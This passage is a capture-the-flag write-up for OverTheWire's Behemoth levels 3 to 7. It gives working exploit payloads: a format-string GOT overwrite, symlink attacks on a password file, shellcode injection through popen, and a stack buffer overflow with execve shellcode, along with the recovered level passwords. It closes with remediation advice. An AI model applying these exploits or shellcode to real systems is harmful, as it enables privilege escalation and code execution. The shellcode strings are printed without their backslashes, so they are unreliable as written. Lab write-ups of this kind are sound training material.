behemoth3@behemoth:/behemoth$ ./behemoth3  
Identify yourself: %x  
Welcome, a7825  
  
aaaand goodbye again.
{% endhighlight %}

Despite inputting %x into the buffer, an output of a7825 was printed (note that %x is a format string to specify an unsigned int as a hexadecimal number[[4]](#ftnt4)). When the binary is given a format string as an input, it starts to leak memory from the stack.

This vulnerability can be abused to overwrite memory by using the %n format string which writes the number of characters written into a pointer parameter. If the pointer parameter is an address that the binary uses, then the memory address of the function can be overwritten to point to shellcode. This can result in the execution of arbitrary code.

#### Memory Addresses of Useful Functions

The objdump command can be utilized to determine the addresses of functions used by the binary:

{% highlight bash %}
behemoth3@behemoth:/behemoth$ objdump -R ./behemoth3  
  
./behemoth3:     file format elf32-i386  
  
DYNAMIC RELOCATION RECORDS  
OFFSET   TYPE              VALUE  
08049794 R_386_GLOB_DAT    __gmon_start__  
080497c0 R_386_COPY        stdin@@GLIBC_2.0  
080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0  
080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0  
080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0  
080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.
{% endhighlight %}

From the output, there are a total of three functions displayed (printf, fgets, and puts). However, the fgets and printf functions should not be overwritten, as these functions must work properly to accept the malicious payload. This leaves the puts function as the only candidate from the objdump output to be overwritten.

#### Overwriting Puts

Before being able to overwrite the memory address of puts, the user input’s location within the stack must first be determined:

{% highlight bash %}
behemoth3@behemoth:/behemoth$ ./behemoth3  
Identify yourself: AAAA%x  
Welcome, AAAA41414141  
  
aaaand goodbye again.
{% endhighlight %}

When inputting AAAA followed by a %x format string, the hexadecimal values of the A’s are immediately printed. This means that the user input is in the first parameter within the stack. Throughout this level, the malicious input will be directed to a file so that the payload can be constructed with the help of GDB:

##### Constructing Payload With GDB

Using the address of puts found by the objdump command, the following payload can be constructed:

{% highlight bash %}
behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'xacx97x04x08'+'%100x%n'" > overwrite
{% endhighlight %}

The xacx97x04x08 string corresponds to the address of the puts function in little endian form (0x080497ac). Following this, the hex output of this string is printed out with a padding of 100 0’s. This type of padding is extremely useful for controlling the value of the memory address of whatever is being overwritten.

When this payload is inputted into the binary within GDB, a segmentation fault occurs, however the address of the puts function does not follow an expected value:

{% highlight bash %}
(gdb) r < overwrite                          
Starting program: /behemoth/behemoth3 < overwrite                                                                                                                                                                           Program received signal SIGSEGV, Segmentation fault.  
xf7e55137 in vfprintf () from /lib32/libc.so.6     (gdb) x/x x080497ac                          
x80497ac:      x08048356
{% endhighlight %}

Observe that the address is x08048356 instead of a low value. To be exact, the value should be equal to the number of characters that are in the payload. This would mean that the value should be 4 (for the address of puts) + 100 (hex formatter) which is 104 in decimal and 0x68 in hex. Prepending AAAA to the beginning of the payload successfully overwrites the puts function:

{% highlight bash %}
behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'AAAAxacx97x04x08' + '%100x%n'" > overwrite  
  
(gdb) r < overwrite  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /behemoth/behemoth3 < overwrite  
Identify yourself: Welcome, AAA                                                                                            41414141  
  
Program received signal SIGSEGV, Segmentation fault.  
0x0000006c in ?? ()

(gdb) x/x 0x080497ac

0x80497ac:      0x0000006c

Note that the puts function points to 0x6c which is 108 in decimal (this change from 104 is a result of prepending 4 A’s)
{% endhighlight %}

### Exploit Development

With the successful overwrite of the puts function, the next step is to control the address that it points to. Currently, it points to 0x6c, but this value must be changed to point to shellcode in order for the successful execution of arbitrary code. The particular methodology used to develop this exploit will work on the basis of overwriting the puts function address two bytes at a time.  Thus, the final exploit will look like the following:

{% highlight bash %}
‘AAAA’ + ‘xacx97x04x08’ + ‘AAAA’ + ‘xaex97x04x08’ + NOP_SLED + SHELLCODE + FORMAT_STRINGS_TO_CONTROL_PUTS_ADDRESS
{% endhighlight %}

Note that there are two addresses within this payload: one is the base address of the puts function, and the other is the puts address + 2 to accommodate for overwriting the address two bytes at a time. This will also mean that two %x strings must be used along with two %n’s. Additionally, a shellcode[[5]](#ftnt5) of 23 bytes will be used.

#### Controlling Puts Address

To begin the exploit, the puts address must first be controlled with the help of format string padding.

{% highlight bash %}
behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'AAAA' + 'xacx97x04x08' + 'AAAA' + 'xaex97x04x08' + 'x90'*100 + 'S'*23 + '%100x%n'" > exploit
{% endhighlight %}

A NOP sled of 100 bytes is used before the shellcode of 23 bytes (denoted by the placeholder ‘S’) is declared. Following the shellcode is a padding of 100 bytes to the hex format specifier which results in the puts address of 0xef when executed:

{% highlight bash %}
(gdb) r < exploit  
Starting program: /behemoth/behemoth3 < exploit  
Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS                                                                                            41414141  
  
Program received signal SIGSEGV, Segmentation fault.  
x000000ef in ?? ()
{% endhighlight %}

 A segmentation fault occurred as expected, because the puts address points to a memory address that it cannot access. Ideally, the puts function should point to an address somewhere within the nop sled. Seeing as the nop sled consists of 100 bytes, there are multiple addresses that would work for this exploit:

{% highlight bash %}
(gdb) x/40x $esp  
0xffffd4d8:     0x080484d1      0x0804857e      0x41414141      0x080497ac  
0xffffd4e8:     0x41414141      0x080497ae      0x90909090      0x90909090  
0xffffd4f8:     0x90909090      0x90909090      0x90909090      0x90909090  
0xffffd508:     0x90909090      0x90909090      0x90909090      0x90909090  
0xffffd518:     0x90909090      0x90909090      0x90909090      0x90909090  
0xffffd528:     0x90909090      0x90909090      0x90909090      0x90909090  
0xffffd538:     0x90909090      0x90909090      0x90909090      0x90909090  
0xffffd548:     0x90909090      0x90909090      0x90909090      0x53535353  
0xffffd558:     0x53535353      0x53535353      0x53535353      0x53535353  
0xffffd568:     0x25535353      0x78303031      0x000a6e25      0x00000000
{% endhighlight %}

The exploit begins at address 0xffffd4d8 + 8 (as can be seen from 0x41414141 which is AAAA) followed by the address of puts and another string of four A’s. This is then followed by puts + 2, and finally the nop sled begins at 0xffffd4e8 + 8. For the purposes of this exploit, a memory address of 0xffffd518 was chosen. Note how this value in decimal is 4294956312 which theoretically could be obtained by passing in an exploit that is about 4294956312 bytes long. In reality, however, this would cause a memory overload (and even if it didn't, printing this many bytes to stdout would take a long time).  As mentioned in [Exploit Development](#h.jagnc9qowxus), this can be bypassed by passing two %n format specifiers which point to two different points in memory whose addresses are two bytes apart.

The largest value for each part of the memory address when split into two is 16^4 - 1 which is 65535. This largely reduces the 4294956312 length previously mentioned. Incidentally, the largest value possible for a 32 bit binary is 16^8 - 1 which is 4294967295 or 0xffffffff.

A value of 0xef was written to the puts function address; however, a value of 0xd510 (for the lower two bytes) was desired. The padding necessary for achieving this value can be determined through the following calculation:

desired_output - current_output + current_padding

{% highlight bash %}
(gdb) p 0xd510 - 0xef + 100  
$3 = 54405
{% endhighlight %}

Thus, a padding of 54405 is needed to output 0xd510:

{% highlight bash %}
(gdb) r < exploit                                                                                                                                                                              
Starting program: /behemoth/behemoth3 < exploit                                                                            
Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS  
  
Program received signal SIGSEGV, Segmentation fault.  
x0000d510 in ?? ()
{% endhighlight %}

The lower two bytes were successfully overwritten to 0xd510. The same method can be used to overwrite the two most significant bytes:

{% highlight bash %}
behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'AAAA' + 'xacx97x04x08' + 'AAAA' + 'xaex97x04x08' + 'x90'*100 + 'S'*23 + '%54405x%n%100x%n'" > exploit
{% endhighlight %}

Note that a padding of 100 was arbitrarily picked so as to perform the following calculations:

After inputting a padding of 100 bytes for the two most significant bytes, the subsequent value was determined to be 0xd574:

{% highlight bash %}
(gdb) r < exploit                                
Starting program: /behemoth/behemoth3 < exploit                
Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS  
  
Program received signal SIGSEGV, Segmentation fault.  
xd574d510 in ?? ()
{% endhighlight %}

The correct padding can subsequently be calculated:

{% highlight bash %}
(gdb) p 0xffff - 0xd574 + 100  
$2 = 10991
{% endhighlight %}

Therefore, the final exploit will look like the following:

{% highlight bash %}
python -c "print 'AAAA' + 'xacx97x04x08' + 'AAAA' + 'xaex97x04x08' + 'x90'*100 + 'x31xc0x50x68x2fx2fx73x68x68x2fx  
62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80' + '%54405x%n%10991x%n'"
{% endhighlight %}

#### Popping a Shell

Note that the S was also changed to the actual shellcode. Executing this payload within GDB causes the debug process to abruptly exit due to the execution of /bin/dash:

{% highlight bash %}
(gdb) r < exploit                                                                                                                                                  Starting program: /behemoth/behemoth3 < exploit                                      Identify yourself: Welcome, AAAAAA1Ph//shh/binPS  
                                         41414141  
process 14128 is executing new program: /bin/dash  
[Inferior 1 (process 14128) exited normally]
{% endhighlight %}

When this payload is piped straight into the binary without GDB, a shell is returned:

{% highlight bash %}
behemoth3@behemoth:/tmp/overwrite_puts$ (python -c "print 'AAAA' + 'xacx97x04x08'                                                                                          
+ 'AAAA' + 'xaex97x04x08' + 'x90'*100 + 'x31xc0x50x68x2fx2fx73x68x68x2f                                                                                      x62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80' + '%54405x%n%10991x%n'";cat -) |                                                                                       /behemoth/behemoth3                                                                                                                                                            
Identify yourself: Welcome, AAAAAA1Ph//shh/binPS                                                                                                                              
  
  
                                         41414141  
whoami  
behemoth4  
cat /etc/behemoth_pass/behemoth4  
ietheishei
{% endhighlight %}

Note that cat -  is appended to the end of the payload. This is an essential part of the exploit which allows the process to interact between stdin and stdout. Without cat, the process immediately exits without errors.

Incidentally, when first performing the exploit of this binary, a /bin/bash shellcode[[6]](#ftnt6) was used, however it did not work outside GDB for unknown reasons. When a binary exploitation does not work as intended, it could be beneficial to use a different shellcode to see if it resolves the problem.

Behemoth 4
----------

With the necessary permissions obtained by compromising the behemoth4 user, the behemoth4 binary can be executed.

### Binary Analysis

Before being able to exploit the binary, it is necessary to understand how it works first.

#### Behavior

Executing the binary does not result in anything out of the ordinary:

{% highlight bash %}
behemoth4@behemoth:/tmp$ /behemoth/behemoth4  
PID not found!
{% endhighlight %}

The program simply prints out “PID not found!” and exits immediately.

#### Ghidra

Within Ghidra, we can get a further look at how the program is getting the PID, and what it does with it:

{% highlight c %}
undefined4 main(void)  
  
{  
 char local_30 [20]; int local_1c; FILE *local_18; __pid_t local_14; undefined *local_c;  local_c = &stack0x00000004; local_14 = getpid(); sprintf(local_30,"/tmp/%d",local_14); local_18 = fopen(local_30,"r"); if (local_18 == (FILE *)0x0) {  
   puts("PID not found!"); }  
 else {  
   sleep(1);   puts("Finished sleeping, fgetcing");   while( true ) {  
     local_1c = fgetc(local_18);     if (local_1c == -1) break;  
      putchar(local_1c);   }  
   fclose(local_18); }  
 return 0;  
}
{% endhighlight %}

The program starts by declaring a couple of variables. The getpid function is called, and local_14 is set to equal its output. This output is then concatenated with /tmp, and local_30 is set to equal it. Afterwards, the local_18 variable is set to equal the output when opening a file in /tmp whose name corresponds to the id of the binary’s process (which is local_30). If the file does not exist, then “PID not found!” is printed out. Otherwise, the contents of the file is read out by using the getchar function within a while loop.

### Binary Exploitation

The problem with this program is that it assumes that it can only read files within the /tmp directory. However, symbolic links can be used to make the program read the password file of the behemoth5 user.

#### Symbolic Link Attack

Seeing as the pid of the binary cannot be easily determined before executing the program, a bash script can be utilized to create many files that correspond to possible PIDs. Before creating this bash script, the approximate PID of the binary must first be found:

{% highlight bash %}
behemoth4@behemoth:/tmp$ ltrace /behemoth/behemoth4  
__libc_start_main(0x804857b, 1, 0xffffd674, 0x8048640 <unfinished ...>  
getpid()                                                                   = 22928  
sprintf("/tmp/22928", "/tmp/%d", 22928)                                    = 10  
fopen("/tmp/22928", "r")                                                   = 0  
puts("PID not found!"PID not found!  
)                                                     = 15+++ exited (status 0) +++
{% endhighlight %}

This process was assigned to the ID of 22928, and it therefore looked for a file called 22928 within the /tmp directory. The PID upon the next execution of the binary must be greater than 22928 but likely less than 30000:

{% highlight bash %}
behemoth4@behemoth:/tmp$ for i in {22928..30000}; do ln -s /etc/behemoth_pass/behemoth5 $i;done
{% endhighlight %}

Now, when the binary is executed, it will read the contents of behemoth5’s password:

{% highlight bash %}
behemoth4@behemoth:/tmp$ /behemoth/behemoth4                                                                                
Finished sleeping, fgetcing                                                                                                
aizeeshing                                                                                                                
{% endhighlight %}

Behemoth 5
----------

By first logging into the account through ssh with the credentials found in [Behemoth 4](#h.eoybw49l4xbw), the behemoth5 binary can be executed.

### Binary Analysis

When executing the binary, nothing out of the ordinary occurs. The binary simply exits without anything printing out to stdout. After downloading the binary onto the attack box, Ghidra could be utilized to help in analyzing the binary.

#### Ghidra

{% highlight c %}
void main(void)  
  
{  
 long lVar1;  
 size_t sVar2;  
 int iVar3;  
 undefined local_38 [4];  
 undefined4 local_34;  
 undefined auStack48 [8];  
 ssize_t local_28;  
 int local_24;  
 hostent *local_20;  
 char *local_1c;  
 FILE *local_18;  
 size_t local_14;  
 undefined *puStack12;  
   
 puStack12 = &stack0x00000004;  
 local_14 = 0;  
 local_18 = fopen("/etc/behemoth_pass/behemoth6","r"); if (local_18 == (FILE *)0x0) {  
   perror("fopen");                   /* WARNING: Subroutine does not return */   exit(1);  
 }  
 fseek(local_18,0,2);  
 lVar1 = ftell(local_18);  
 local_14 = lVar1 + 1;  
 rewind(local_18);  
 local_1c = (char *)malloc(local_14);  
 fgets(local_1c,local_14,local_18);  
 sVar2 = strlen(local_1c);  
 local_1c[sVar2] = '0';  
 fclose(local_18);  
 local_20 = gethostbyname("localhost"); if (local_20 == (hostent *)0x0) {  
   perror("gethostbyname");                   /* WARNING: Subroutine does not return */   exit(1);  
 }  
 local_24 = socket(2,2,0); if (local_24 == -1) {  
   perror("socket");                   /* WARNING: Subroutine does not return */   exit(1);  
 }  
 local_38._0_2_ = 2;  
 iVar3 = atoi("1337");  
 local_38._2_2_ = htons((uint16_t)iVar3);  
 local_34 = *(undefined4 *)*local_20->h_addr_list;  
 memset(auStack48,0,8);  
 sVar2 = strlen(local_1c);  
 local_28 = sendto(local_24,local_1c,sVar2,0,(sockaddr *)local_38,0x10); if (local_28 == -1) {  
   perror("sendto");                   /* WARNING: Subroutine does not return */   exit(1);  
 }  
 close(local_24);                   /* WARNING: Subroutine does not return */ exit(0);  
}
{% endhighlight %}

After many different variables are declared, the password for the behemoth6 user is read into the program. Afterwards, the gethostbyaddressname function is called with the argument “localhost”. Shortly afterwards, the socket function is called using the arguments (2,2,0). Observe the following code and the corresponding Ghidra output:

Source1:

![](/reports/Behemoth/image12.png)

Ghidra1:

![](/reports/Behemoth/image4.png)

Source2:

![](/reports/Behemoth/image7.png)

Ghidra2:

![](/reports/Behemoth/image1.png)

Source3:

  ![](/reports/Behemoth/image3.png)        

Ghidra3:

![](/reports/Behemoth/image11.png)

The socket arguments of Ghidra3 are identical to the arguments seen from behemoth5. Therefore, the arguments seen in the behemoth5 binary correspond to iPv4, UDP, and default protocol respectively[[7]](#ftnt7).

Following the calling of the socket function, iVar3 is set to be 1337 before a sendto function is called. From these lines of code, it can be discerned that a UDP socket is opened on port 1337, and the password of the behemoth6 user is sent to it.

### Catching Behemoth6 Password Through UDP

Before executing the binary, it is essential that another session be opened so that a UDP listener can be set up on port 1337:

behemoth5@behemoth:~$ nc -lup 1337 localhost

The -u flag specifies UDP mode, -p is for specifying a port, and -l tells nc to listen for inbound connections

After executing the binary, the password of the behemoth6 user can be seen on stdout:

![](/reports/Behemoth/image10.png)

Note that the blue line is a result of using tmux[[8]](#ftnt8), and it represents the delimiter between different sessions

This challenge was more of a reverse engineering exercise, but it is good practice for developing the skill of understanding the functionality of a binary.

Behemoth 6
----------

After logging in as the behemoth6 user and executing the behemoth6 binary, the following output is seen:

behemoth6@behemoth:/behemoth$ ./behemoth6  
Incorrect output.

Furthermore, performing the ls command on the /behemoth directory reveals another interesting file possibly related to behemoth6:

{% highlight bash %}
behemoth6@behemoth:/behemoth$ ls  
behemoth0  behemoth1  behemoth2  behemoth3  behemoth4  behemoth5  behemoth6  behemoth6_reader  behemoth7
{% endhighlight %}

Namely, that file is called behmoth6_reader and it might be used by the behemoth6 binary. After downloading the binary onto the attack box, the binary can be analyzed with the help of Ghidra.

### Ghidra

Ghidra translated the assembly code found for each binary into the following:

![](/reports/Behemoth/image9.png)

The code on the left was produced by the behemoth6 binary, while the code on the right is from the behemoth_reader. Looking at the code for the bhemeoth6_reader program, a file named shellcode.txt is expected. However, the contents of this file are not printed out anywhere. If a file named shellcode.txt exists, then a small sanitization is performed against the file: if the 0xb byte exists within the file, then the program immediately exits.

In short, the program is executing the contents of the shellcode.txt file as machine code. Therefore, shellcode will get executed by the binary. This, however, will not directly result in a privileged shell due to the fact that the SETUID bit is not enabled on the behemoth6_reader binary. Rather, the behemoth6 binary has the SETUID bit, and its interaction with the behemoth6_reader will determine the significance of the shellcode.

Looking at the code for behemoth6, observe that the file is opened using the popen function in read mode, after which the output is passed into the __stream variable. This variable then gets passed into __s1 which is compared against the string ‘HelloKitty’ in the strcmp function. If the contents of this variable matches the string, then a /bin/sh shell is returned.

### Abusing popen()

The output of the popen function is determined by the behemoth6_reader. Consequently, if the behemoth6_reader executes shellcode that makes it print out ‘HelloKitty’, then a shell will be returned. There are already shellcodes online that perform this operation, and the following shellcode was used[[9]](#ftnt9):

{% highlight c %}
char code[] =   "xe9x1ex00x00x00"  //          jmp    (relative) <MESSAGE>   "xb8x04x00x00x00"  //          mov    $0x4,%eax   "xbbx01x00x00x00"  //          mov    $0x1,%ebx   "x59"                  //          pop    %ecx   "xbax0fx00x00x00"  //          mov    $0xf,%edx   "xcdx80"              //          int    $0x80   "xb8x01x00x00x00"  //          mov    $0x1,%eax   "xbbx00x00x00x00"  //          mov    $0x0,%ebx   "xcdx80"              //          int    $0x80   "xe8xddxffxffxff"  //          call   (relative) <GOBACK>
{% endhighlight %}

The code above prints out whatever string follows it (however the string must be in machine code). This code, coupled with a subsequent string in shellcode will result in a successful.string comparison. To facilitate the conversion between ascii and shellcode, a conversion table[[10]](#ftnt10) was used.

Ascii:

HelloKitty

Shellcode:

x48x65x6cx6cx6fx4bx69x74x74x79

After creating a directory in /tmp (so as to be able to create files), the following code was printed into shellcode.txt:

{% highlight bash %}
behemoth6@behemoth:/tmp/behemoth6$  python -c "print 'xe9x1ex00x00x00xb8x04x00x00x00xbbx01x00x00x00x59xbax0fx00x00x00xcdx80xb8x01x00x00x00xbbx00x00x00x00xcdx80xe8xddxffxffxff' +'x48x65x6cx6cx6fx4bx69x74x74x79'" > shellcode.txt
{% endhighlight %}

Now when executing the behemoth6 binary, the shellcode file will be called when the behemoth6_reader is executed via the popen function, subsequently making the reader print out HelloKitty. This will cause the strcmp function to run true, and a /bin/sh shell is subsequently returned:

{% highlight bash %}
behemoth6@behemoth:/tmp/behemoth6$ /behemoth/behemoth6  
Correct.  
$ whoami  
behemoth7  
$ cat /etc/behemoth_pass/behemoth7  
baquoxuafo
{% endhighlight %}

Behemoth 7
----------

After successfully exploiting the behemoth6 binary, we are left with the final challenge of exploiting the behemoth7 binary.

### Binary Analysis

Before analysing the binary within tools such as GDB and Ghidra, it is advised to first start by executing the binary to observe its behavior.

#### Behavior

Upon executing the binary, nothing conspicuous occurs. The binary immediately exits after execution without printing anything to stdout.

#### Ghidra

After downloading the binary onto the attack box, the binary can be analyzed with the help of Ghidra. Using Ghidra, the assembly code of the binary was converted to the following code:

{% highlight c %}
undefined4 main(int param_1,int param_2,int param_3){ size_t __n;  
 ushort **ppuVar1; char local_210 [512]; int local_10; int local_c; char *local_8;  
   
 local_8 = *(char **)(param_2 + 4);  
 local_c = 0; while (*(int *)(param_3 + local_c * 4) != 0) {  
   __n = strlen(*(char **)(param_3 + local_c * 4));   memset(*(void **)(param_3 + local_c * 4),0,__n);  
   local_c = local_c + 1;  
 }  
 local_10 = 0; if (1 < param_1) {   while ((*local_8 != '0' && (local_10 < 0x200))) {  
     local_10 = local_10 + 1;  
     ppuVar1 = __ctype_b_loc();     if ((((*ppuVar1)[*local_8] & 0x400) == 0) &&  
        (ppuVar1 = __ctype_b_loc(), ((*ppuVar1)[*local_8] & 0x800) == 0)) {       fprintf(stderr,"Non-%s chars found in string, possible shellcode!n","alpha");                   /* WARNING: Subroutine does not return */       exit(1);  
     }  
     local_8 = local_8 + 1;  
   }   strcpy(local_210,*(char **)(param_2 + 4));  
 } return 0;  
}
{% endhighlight %}

At the very top of the code, it can be seen that the main function takes three parameters. These parameters most likely correspond to the input given by argc[[11]](#ftnt11). At the top of the main function are declarations of variables, and among them is local_210 with 512 bytes allocated to it. Toward the middle of the main function is a while loop located within an if statement. Inside of the while loop is an if statement which, upon running true, prints the following:

{% highlight c %}
fprintf(stderr,"Non-%s chars found in string, possible shellcode!n","alpha"); 
{% endhighlight %}

Therefore, it is likely there is a filter on non alphanumeric characters[[12]](#ftnt12). This could limit the possible shellcode that could be used if the EIP register cannot be overwritten. However, looking at the code, there does not seem to be any boundary checks, and the EIP register should capable of being overwritten. This can be verified by inputting a large number of bytes into the program:

{% highlight bash %}
behemoth7@behemoth:/behemoth$ gdb -q /behemoth/behemoth7  
Reading symbols from /behemoth/behemoth7...(no debugging symbols found)...done.  
(gdb) r $(python -c "print 'A'*1000")  
Starting program: /behemoth/behemoth7 $(python -c "print 'A'*1000")  
  
Program received signal SIGSEGV, Segmentation fault.  
0x41414141 in ?? ()
{% endhighlight %}

The EIP register was successfully overwritten as can be seen by the value of the instruction pointer (0x41414141), which is AAAA in hex. Therefore, the shellcode that will be used for exploiting this binary does not have to be made of alphanumeric characters.

### Constructing Payload

The payload will consist of the necessary amount of bytes to equal the EIP offset, followed by the address of the shellcode, after which the NOP sled will be declared which precedes the shellcode.

#### Calculating EIP Offset

To begin the construction of the exploit, the EIP offset must first be calculated:

{% highlight bash %}
pwndbg> r $(cyclic 1000)                                                                                                                                              
Starting program: /home/0xd4y/business/other/overthewire/behemoth/7/behemoth7 $(cyclic 1000)  
                                                                                   
Program received signal SIGSEGV, Segmentation fault.  
0x66616168 in ?? ()                        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0                                 EBX  0x0                                 ECX  0xffffd290 ◂-- 'yaaj'                 EDX  0xffffcde0 ◂-- 'yaaj'                 EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0x66616167 ('gaaf')                                                                                                                                                    ESP  0xffffcc10 ◂-- 0x66616169 ('iaaf')                                                                                                                                      EIP  0x66616168 ('haaf')                                                                                                                                                      
──────────────────────────────────────[ DISASM ]──────────────────────────────────────                                                                                        
Invalid address 0x66616168                 pwndbg> cyclic -l 0x66616168  
528
{% endhighlight %}

The offset was calculated as 528 bytes, and as such 528 bytes of junk must first be inputted into the binary before the EIP register can be controlled.

#### Shellcode Address

The next step is to determine the address of the shellcode[[13]](#ftnt13). This can easily be analyzed within GDB:

{% highlight bash %}
(gdb) r $(python -c "print 'A'*528+'BBBB'+'A'*112+'x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80'")  
  
Starting program: /behemoth/behemoth7 $(python -c "print 'A'*528+'BBBB'+'A'*112+'x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80'")  
  
Program received signal SIGSEGV, Segmentation fault.  
0x42424242 in ?? ()

Note that the EIP register was successfully controlled to be 0x42424242 (equivalent to BBBB)

The beginning of the shellcode can be found withhin the stack pointer:

(gdb) x/100x $esp-200                                                                                                                                                       0xffffd228:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd238:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd248:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd258:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd268:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd278:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd288:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd298:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd2a8:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd2b8:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd2c8:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd2d8:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd2e8:     0x41414141      0x42424242      0x41414141      0x41414141                                                                                                   0xffffd2f8:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd308:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd318:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd328:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd338:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffffd348:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd358:     0x41414141      0x41414141      0x99580b6a      0x2d686652  
0xffffd368:     0x52e18970      0x2f68686a      0x68736162      0x6e69622f  
0xffffd378:     0x5152e389      0xcde18953      0x00000080      0xffffd4df  
0xffffd388:     0xffffd4f3      0x00000000      0xffffd799      0xffffd7ac  
0xffffd398:     0xffffdd68      0xffffdd83      0xffffddb8      0xffffddcd  
0xffffd3a8:     0xffffdde5      0xffffde01      0xffffde10      0xffffde21
{% endhighlight %}

The junk after the EIP begins at 0xffffd2e8 + 8 which is 0xffffd2f0. Following the junk bytes is the shellcode at 0xffffd358 + 8 which is equivalent to 0xffffd360. Therefore the EIP value should be overwritten to point to f 0xffffd360.

#### Final Payload

With the knowledge of the EIP offset and the shellcode address, the final payload can now be constructed:

{% highlight bash %}
‘A’*528 + ‘x48xd3xffxff’ + ‘A’*112 + ‘x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80’
{% endhighlight %}

It is important to note that the repetition of ‘A’ 112 times was chosen so as to not spill 0x41 into the shellcode portion of memory. This value of 112 is not necessary, but it should be a multiple of 4 to prevent spilling into memory addresses that only shellcode should occupy.

The payload works in GDB as can be seen from /bin/bash being executed:

{% highlight bash %}
(gdb) r $(python -c "print 'A'*528+'x60xd3xffxff'+'A'*112+'x6ax0bx58x99x52x66                                                                                      x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x5                                                                                        
1x53x89xe1xcdx80'")                                                                                                                                                      
The program being debugged has been started already.                                                                                                                          
Start it from the beginning? (y or n) y                                                                                                                                        
Starting program: /behemoth/behemoth7 $(python -c "print 'A'*528+'x60xd3xffxff'+'A'*112+'x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68  
x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80'")                    
process 27236 is executing new program: /bin/bash                                                                                                                              
behemoth7@behemoth:/behemoth$                                                        
Program received signal SIGINT, Interrupt.                                                                                                                                    
0x00007ffff76ed441 in __pselect (nfds=1, readfds=0x7fffffffdac0, writefds=0x0,                                                                                                
   exceptfds=0x0, timeout=<optimized out>, sigmask=0x7fffffffda40)                                                                                                            
   at ../sysdeps/unix/sysv/linux/pselect.c:69                                                                                                                                
69      ../sysdeps/unix/sysv/linux/pselect.c: No such file or directory.                                                                                                    
{% endhighlight %}

When trying this payload outside of GDB, a shell is successfully popped, and the final local user is compromised:

{% highlight bash %}
behemoth7@behemoth:/behemoth /behemoth/behemoth7 $(python -c "print 'A'*528+'x60xd                                                                                        
3xffxff'+'A'*112+'x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx6                                                                                        
2x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80'")                                                                                                                                                                                                                                
bash-4.4$ whoami                                                                        
behemoth8                                    
bash-4.4$ cat /etc/behemoth_pass/behemoth8                                                                                                                                   pheewij7Ae
{% endhighlight %}

Conclusion
==========

* * *

Every binary tested was successfully exploited. Many binaries which in practice should not be vulnerable, turned out to be exploitable due to the calling of sensitive system commands (in particular /bin/sh). This resulted in the horizontal privilege escalation in [Behemoth 0](#h.y1go15cthbxu) and [Behemoth 6](#h.1iiwc3vpzmaj).

There were multiple different vulnerabilities associated with each binary, running from format string exploits to buffer overflows and privilege escalation via the PATH environment variable.The following remediations should strongly be considered:

*   Perform boundary checks on user input

*   Multiple binaries were vulnerable due to the lack of boundary checks
*   Shellcode injection was possible on many binaries due to this lack of validation
*   Bad shellcode filtering can be bypassed if EIP can be overwritten as can be seen in [Behemoth 7](#h.tqwpdz749mlq)

*   Filter user input

*   Malicious shellcode could easily be injected in multiple binaries due to the lack of user input validation (although shellcode could be encoded, this would nevertheless mitigate these kind of attacks)

*   Never run sensitive system commands unless absolutely necessary

*   System commands such as /bin/sh should rarely ever be called (especially within a SETUID binary) due to its insecurity
*   Binaries that should not have been vulnerable turned out to be exploitable due to calling /bin/sh

*   Always use the full path of a command

*   PATH environment variable attacks were present on [Behemoth 2](#h.9e7hwp9wx39h)

*   Never read files that can be created by an untrusted user

*   Symbolic links can be used to exploit this vulnerability as can be seen in [Behemoth 2](#h.9e7hwp9wx39h) and [Behemoth 4](#h.eoybw49l4xbw)

* * *

